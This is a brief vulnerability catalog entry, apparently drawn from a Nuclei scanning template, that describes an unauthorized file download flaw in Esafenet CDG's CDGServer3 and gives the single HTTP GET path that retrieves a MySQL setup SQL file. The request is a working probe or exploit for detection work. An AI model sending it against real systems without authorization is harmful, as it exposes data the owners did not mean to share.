# Vulnerability: Esafenet CDG mysql - File Read
**Classification:** ESAFENET
**Source:** Nuclei Template (`esafenet-mysql-fileread.yaml`)

## Description
CDGServer3 Unauthorized File Download vulnerability is detected.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql
```

